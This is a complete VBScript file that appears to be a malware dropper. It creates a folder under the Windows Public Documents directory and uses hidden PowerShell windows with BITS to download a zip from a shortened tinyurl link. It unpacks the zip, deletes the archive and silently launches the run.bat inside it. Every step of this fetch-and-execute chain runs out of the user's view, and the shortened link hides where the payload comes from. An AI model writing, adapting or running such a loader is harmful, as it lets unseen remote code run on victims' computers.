Option Explicit
Dim fso, shell, publicDocs, baseDir, zipPath, outDir, url
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
publicDocs = shell.ExpandEnvironmentStrings("%PUBLIC%") & "\Documents"
baseDir = publicDocs & "\keys"
If Not fso.FolderExists(baseDir) Then
    fso.CreateFolder(baseDir)
End If
zipPath = baseDir & "\assets.zip"
outDir = baseDir
url = "https://tinyurl.com/2c3w2tb7"
Dim bitsCmd
bitsCmd = "powershell -NoLogo -NoProfile -Command ""Start-BitsTransfer -Source '" & url & "' -Destination '" & zipPath & "' -ErrorAction Stop"""
shell.Run bitsCmd, 0, True
shell.Run "powershell -NoLogo -NoProfile -Command ""Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & outDir & "' -Force""", 0, True
If fso.FileExists(zipPath) Then fso.DeleteFile zipPath, True
Dim folder, gitFolder
gitFolder = ""
For Each folder In fso.GetFolder(outDir).SubFolders
    If InStr(folder.Name, "-main") > 0 Or InStr(folder.Name, "-master") > 0 Then
        gitFolder = folder.Path
        Exit For
    End If
Next
If gitFolder <> "" Then
    Dim f, subf
    For Each f In fso.GetFolder(gitFolder).Files
        f.Move baseDir & "\" & f.Name
    Next
    For Each subf In fso.GetFolder(gitFolder).SubFolders
        subf.Move baseDir & "\" & subf.Name
    Next
    If fso.FolderExists(gitFolder) Then fso.DeleteFolder gitFolder, True
End If
shell.Run """" & baseDir & "\run.bat" & """", 0, False
